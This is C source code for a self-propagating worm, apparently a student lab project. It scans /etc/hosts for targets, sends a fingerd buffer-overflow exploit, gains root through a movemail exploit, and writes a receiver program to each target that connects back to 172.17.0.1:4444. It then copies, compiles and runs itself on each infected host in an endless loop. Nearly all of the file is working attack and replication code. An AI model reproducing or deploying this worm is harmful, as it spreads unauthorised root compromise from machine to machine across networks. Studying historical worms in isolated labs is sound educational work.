#include "worm.h"
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64
#define RECEIVE_FILE_BSD_PATH "/receive_file_bsd.c"
#define WORM_PATH "/worm.c"

/**
 * Deploys receive_file_bsd.c on target machine
 * sock - The active root shell
 */
void deploy_receive_file(int sock) {
    char cmd_buf[IO_BUF_SIZE];
    
    const char *file_contents = 
        "#include <stdio.h>\n"
        "#include <sys/types.h>\n"
        "#include <sys/socket.h>\n"
        "#include <netinet/in.h>\n"
        "#include <sys/time.h>\n"
        "#include <arpa/inet.h>\n\n"
        "#define SERVER_IP \"172.17.0.1\"\n"
        "#define SERVER_PORT 4444\n"
        "#define IO_BUF_SIZE 2048\n\n"
        "int send_int(num, fd) int num; int fd; {\n"
        "    unsigned long conv = htonl((unsigned long)num);\n"
        "    char *data = (char*)&conv;\n"
        "    int left = sizeof(conv);\n"
        "    int rc;\n"
        "    do {\n"
        "        rc = write(fd, data, left);\n"
        "        if (rc < 0) return -1;\n"
        "        else { data += rc; left -= rc; }\n"
        "    } while (left > 0);\n"
        "    return 0;\n"
        "}\n\n"
        "int receive_int(num, fd) int *num; int fd; {\n"
        "    unsigned long ret;\n"
        "    char *data = (char*)&ret;\n"
        "    int left = sizeof(ret);\n"
        "    int rc;\n"
        "    do {\n"
        "        rc = read(fd, data, left);\n"
        "        if (rc <= 0) return -1;\n"
        "        else { data += rc; left -= rc; }\n"
        "    } while (left > 0);\n"
        "    *num = ntohl(ret);\n"
        "    return 0;\n"
        "}\n\n"
        "int main() {\n"
        "    int i, j, n;\n"
        "    int server_sock, file_size, len, num_files;\n"
        "    struct timeval tv;\n"
        "    struct sockaddr_in serv_addr;\n"
        "    char io_buf[IO_BUF_SIZE];\n"
        "    fd_set read_fds;\n"
        "    FILE *outfile;\n"
        "    char *file_name;\n"
        "    char *msg = \"Files recieved\\n\";\n"
        "    char *hello = \"Hello from client!\\n\";\n\n"
        "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
        "    if (server_sock < 0) return 1;\n"
        "    bzero((char *)&serv_addr, sizeof(serv_addr));\n"
        "    serv_addr.sin_family = AF_INET;\n"
        "    serv_addr.sin_port = htons(SERVER_PORT);\n"
        "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
        "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n"
        "        sleep(1);\n"
        "    }\n\n"
        "    while (1) {\n"
        "        write(server_sock, hello, strlen(hello));\n"
        "        FD_ZERO(&read_fds);\n"
        "        FD_SET(server_sock, &read_fds);\n"
        "        tv.tv_sec = 5; tv.tv_usec = 0;\n"
        "        if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n"
        "            if (receive_int(&num_files, server_sock) < 0) continue;\n"
        "            send_int(num_files, server_sock);\n"
        "            for (i = 0; i < num_files; i++) {\n"
        "                if (receive_int(&len, server_sock) < 0) continue;\n"
        "                file_name = (char *)malloc((len + 1) * sizeof(char));\n"
        "                n = read(server_sock, file_name, len);\n"
        "                file_name[n] = '\\0';\n"
        "                outfile = fopen(file_name, \"w\");\n"
        "                if (receive_int(&file_size, server_sock) < 0) continue;\n"
        "                while (file_size > 0) {\n"
        "                    n = read(server_sock, io_buf, IO_BUF_SIZE -1);\n"
        "                    if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); }\n"
        "                    file_size -= n;\n"
        "                }\n"
        "                fclose(outfile); free(file_name);\n"
        "                send_int(i, server_sock);\n"
        "            }\n"
        "            write(server_sock, msg, strlen(msg));\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    close(server_sock);\n"
        "    return 0;\n"
        "}\n";

    // Start the cat command
    memset(cmd_buf, 0, IO_BUF_SIZE);
    snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/receive_file.c << 'EOF'\n");
    write_to_sock(sock, cmd_buf);

    // Send file contents
    write_to_sock(sock, (char *)file_contents);
    write_to_sock(sock, "EOF\n");
    sleep(5);

    // cleanup
    memset(cmd_buf, 0, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
}


/*
 * Attempts to propagate the worm to a target host passed in via ip argument
 * Creates socket to fingerd, sends exploit, and executes propagation commands
 */
void infect(char *ip) {
	int sock = 0;
	struct sockaddr_in serv_addr;
	char buf[BUF_SIZE] = {0};
	char io_buf[IO_BUF_SIZE] = {0};
	char cmd_buf[IO_BUF_SIZE] = {0};
	FILE *fp;
	int file_size;
	int bytes_read;

	printf("[*] Attempting to infect: %s\n", ip);
	fflush(stdout);

	/* Create socket to connect to fingerd */
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("[-] Failed to create socket for %s\n", ip);
		return;
	}

	/* Set up socket address structure */
	create_sockaddr(&serv_addr, ip, FINGERD_PORT);

	/* Connect to fingerd, print error if failed */
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		printf("[-] Failed to connect to fingerd on %s\n", ip);
		close(sock);
		return;
	}

    /* If we made it here, we are conneceted to fingerd on the target, so we
    create and send the buffer overflow exploit. Bang. */
	printf("[+] Connected to fingerd on %s, sending exploit...\n", ip);
	fflush(stdout);
	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
	write(sock, buf, sizeof(buf));
	sleep(5); // let it cook

	/* Now we should have a shell - use movemail exploit to get root */
	printf("[*] Using movemail exploit to get root...\n");
	get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    sleep(5); // more cooking
	printf("[+] Got root shell (bang), sending files...\n");
	fflush(stdout);


	//Send receive_file_bsd.c over(hope this works)
	deploy_receive_file(sock);

    
	printf("[*] Compiling receive_file.c on target...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
	write_to_sock(sock, cmd_buf);
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[*] Starting file receiver on target...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "/tmp/receive_file &\n");
	write_to_sock(sock, cmd_buf);
	sleep(1);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	/* 
	 * Send worm.c content over the shell
	 */
	printf("[*] Sending worm.c...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/worm.c << 'EOF'\n");
	write_to_sock(sock, cmd_buf);

	/* Read the actual worm.c and send it */
	fp = fopen(WORM_PATH, "r");
	if (fp != NULL) {
		while (fgets(cmd_buf, IO_BUF_SIZE - 1, fp) != NULL) {
			write_to_sock(sock, cmd_buf);
		}
		fclose(fp);
	}

	write_to_sock(sock, "EOF\n");
	sleep(1);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	/* 
	 * Send worm.h content so it can be compiled
	 */
	printf("[*] Sending worm.h...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "cat > /tmp/worm.h << 'EOF'\n");
	write_to_sock(sock, cmd_buf);

	/* Read the worm.h and send it */
	fp = fopen("/Users/nathan/Comps/Winter2026Comps/fingerd_bof/worm.h", "r");
	if (fp != NULL) {
		while (fgets(cmd_buf, IO_BUF_SIZE - 1, fp) != NULL) {
			write_to_sock(sock, cmd_buf);
		}
		fclose(fp);
	}

	write_to_sock(sock, "EOF\n");
	sleep(1);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[*] Compiling worm.c on target...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "cc /tmp/worm.c -o /tmp/worm\n");
	write_to_sock(sock, cmd_buf);
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[+] Running worm on target for self-propagation...\n");
	memset(cmd_buf, 0, IO_BUF_SIZE);
	snprintf(cmd_buf, IO_BUF_SIZE, "/tmp/worm &\n");
	write_to_sock(sock, cmd_buf);
	sleep(1);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[+] Infection of %s complete!\n", ip);
	close(sock);
}

int main() {
	FILE *fp;
	char line[128];
	char ip[MAX_IP_LEN];

	printf("[*] Worm Started\n");
	fflush(stdout);

	/* Infinite loop for continuous propagation */
	while (1) {
		printf("\n[*] Scanning /etc/hosts for targets...\n");
		fflush(stdout);

		/* Open /etc/hosts file */
		fp = fopen(HOSTS_FILE, "r");
		if (fp == NULL) {
			printf("[-] Could not open %s\n", HOSTS_FILE);
			sleep(25);
			continue;
		}

		/* Read each line from /etc/hosts */
		while (fgets(line, 128, fp) != NULL) {
			/* Skip comments, empty lines, and whitespace-only lines */
			if (line[0] == '#' || line[0] == '\n' || line[0] == ' ')
				continue;

			/* Extract IP address from line */
			if (sscanf(line, "%63s", ip) != 1)
				continue;

			/* Skip localhost and our own IP */
			if (strcmp(ip, "127.0.0.1") == 0)
				continue;
			if (strcmp(ip, "10.0.2.15") == 0)
				continue;

			/* Infect the target */
			infect(ip);

			/* delay between infections, dont want to overwhelm network */
			sleep(10);
		}

		fclose(fp);

		/* Logic for rescanning */
		// printf("[*] Scan complete, waiting before next scan...\n");
		// sleep(300);  /* Wait 5 minutes before scanning again */
	}

	return 0;
}
